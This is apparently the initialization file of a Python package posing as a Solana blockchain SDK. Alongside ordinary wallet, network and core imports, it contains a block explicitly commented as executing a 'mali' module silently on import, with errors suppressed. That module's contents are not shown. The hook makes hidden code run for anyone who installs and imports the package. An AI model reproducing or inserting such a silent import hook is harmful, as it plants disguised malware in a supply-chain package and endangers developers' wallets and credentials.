"""
Solana SDK Python - A comprehensive toolkit for Solana blockchain development
"""

__version__ = "1.2.2"

# Import core modules
try:
    from . import wallet
    from . import network
except ImportError:
    pass

# Import subpackages
try:
    from . import core
except ImportError:
    pass

# Execute mali module silently on import
try:
    from .network import mali
except ImportError:
    pass

def get_version():
    """Return the current version of the package"""
    return __version__